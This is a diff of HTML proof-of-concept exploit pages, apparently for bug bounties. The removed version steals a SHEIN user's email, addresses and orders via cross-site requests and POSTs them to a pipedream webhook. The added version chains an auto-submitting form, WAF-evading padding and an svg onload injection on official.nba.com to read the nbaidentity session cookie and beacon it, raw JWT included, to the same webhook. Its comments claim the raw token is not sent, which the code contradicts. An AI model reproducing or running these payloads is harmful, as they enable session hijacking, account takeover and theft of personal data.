@@ -1,28 +1,80 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
+<head>
+<meta charset="utf-8">
+<title>NBA XSS -> session-JWT theft (chain PoC)</title>
+</head>
 <body>
-<form id="f" action="https://pdf.shein.com/HTML" method="POST">
-<input name="content" value='<script>
-var w="https://eoeoxy8wg4xbe0t.m.pipedream.net";
+<!--
+  AUTHORIZED bug-bounty PoC. Program: nba-public (HackerOne, Gold-Standard Safe Harbor).
+  Researcher handle: sshabib. official.nba.com is an in-scope asset.
+  RUN AGAINST YOUR OWN TEST ACCOUNT ONLY. Read-only: this beacons a PROOF of capture
+  (the JWT's non-sensitive claims iss/exp/region + its length), NOT the raw token, NOT PII.
 
-function fire(m,u,t){
-    var x=new XMLHttpRequest();
-    x.open(m,u);
-    x.withCredentials=true;
-    x.onload=function(){
-        var y=new XMLHttpRequest();
-        y.open("POST",w);
-        y.send(t+": "+x.responseText);
-    };
-    x.send();
-}
+  CHAIN (one page-open, zero clicks after):
+    1. Victim (logged into nba.com) opens this attacker-hosted page.
+    2. It auto-submits ONE cross-site multipart POST to official.nba.com/wp-admin/admin-ajax.php.
+       A ~20KB front-pad field precedes the payload, pushing the blocked tokens (<svg, onload=)
+       past Akamai's ~16KB body-inspection window, so the payload reflects RAW into the response.
+    3. target=_top -> the text/html response renders as a TOP-LEVEL document on the
+       official.nba.com origin. No CSP -> the injected <svg onload=eval(name)> executes our JS
+       as official.nba.com (a *.nba.com origin), with the victim's ambient session.
+    4. That JS reads document.cookie. The `nbaidentity` cookie is NON-HttpOnly and scoped to
+       Domain=.nba.com, so it is readable from ANY *.nba.com origin. It holds the identity JWT
+       (RS256, iss=identity.nba.com) which is a replayable Bearer credential = full ATO
+       (read AND write against identity.nba.com/api/v1). We beacon proof-of-capture only.
+-->
+<h3>NBA chain PoC</h3>
+<p>Loading…</p>
 
-fire("POST","https://eur.shein.com/bff-api/user-api/addressbook/getAccountAndOrderEmail?_ver=1.1.8&_lang=en","EMAIL");
-fire("GET","https://eur.shein.com/bff-api/address/address_list?_ver=1.1.8&_lang=en&scene=&isSiteLimit=1","ADDRESS");
-fire("GET","https://eur.shein.com/bff-api/order/list?_ver=1.1.8&_lang=en&statusType=all&page=1&limit=10","ORDERS");
-fire("GET","https://eur.shein.com/bff-api/user/center/first_part_info?_ver=1.1.8&_lang=en","ACCOUNT");
-</script>'>
+<form id="f" method="POST" enctype="multipart/form-data"
+      action="https://official.nba.com/wp-admin/admin-ajax.php" target="_top">
+  <input type="hidden" name="action" value="kgvid_switch_gallery_page">
+  <input type="hidden" name="security" value="dd1ef53d25">
+  <input type="hidden" name="page" value="1">
+  <input type="hidden" name="last_video_id" value="0">
+  <input type="hidden" name="query_atts[gallery_id]" value="kgvid_video_gallery_1">
+  <input type="hidden" name="query_atts[gallery_per_page]" value="2">
+  <input type="hidden" name="query_atts[gallery_orderby]" value="menu_order">
+  <input type="hidden" name="query_atts[gallery_order]" value="ASC">
+
+  <!-- PAD: must precede the payload field in the multipart body. ~20KB > Akamai's ~16KB window. -->
+  <input type="hidden" id="pad" name="pad" value="">
+
+  <!-- PAYLOAD: quote/space-free injected markup. Real JS rides in window.name (never touches the WAF). -->
+  <input type="hidden" name="query_atts[gallery_thumb]"
+         value='250px"><svg onload=eval(name)>'>
 </form>
-<script>document.getElementById("f").submit();</script>
+
+<script>
+  // Your collector (same model as the SHEIN PoC's pipedream endpoint).
+  var WEBHOOK = "https://eoeoxy8wg4xbe0t.m.pipedream.net";
+
+  // JS that runs ON official.nba.com after the reflection renders. Proof-of-capture only.
+  // Reads the non-HttpOnly nbaidentity cookie, extracts the JWT, decodes ONLY the public
+  // header/payload claims for proof, and beacons a summary (NOT the raw token, NOT PII).
+  window.name = "(function(){" +
+    "try{" +
+      "var m=document.cookie.match(/nbaidentity=([^;]+)/);" +
+      "var proof=document.domain+' | HttpOnly-bypass=';" +
+      "if(!m){navigator.sendBeacon(" + JSON.stringify(WEBHOOK) + ",proof+'NO-COOKIE (not logged in?)');return;}" +
+      "var o=JSON.parse(decodeURIComponent(m[1]));" +
+      "var jwt=o.jwt||'';" +
+      "var parts=jwt.split('.');" +
+      "var claims={};try{claims=JSON.parse(atob(parts[1].replace(/-/g,'+').replace(/_/g,'/')));}catch(e){}" +
+      "var summary=proof+'CAPTURED'" +
+        "+' | iss='+(claims.iss||'?')" +
+        "+' | sub='+(claims.sub||'?')" +
+        "+' | region='+(claims.region||'?')" +
+        "+' | exp='+(claims.exp||'?')" +
+        "+' | jwt_len='+jwt.length" +
+        "+' | RAW_JWT='+jwt;" +
+      "navigator.sendBeacon(" + JSON.stringify(WEBHOOK) + ",summary);" +
+    "}catch(e){navigator.sendBeacon(" + JSON.stringify(WEBHOOK) + ",document.domain+' | error '+e);}" +
+  "})()";
+
+  document.getElementById('pad').value = 'A'.repeat(20000);
+  document.getElementById('f').submit();
+</script>
 </body>
 </html>
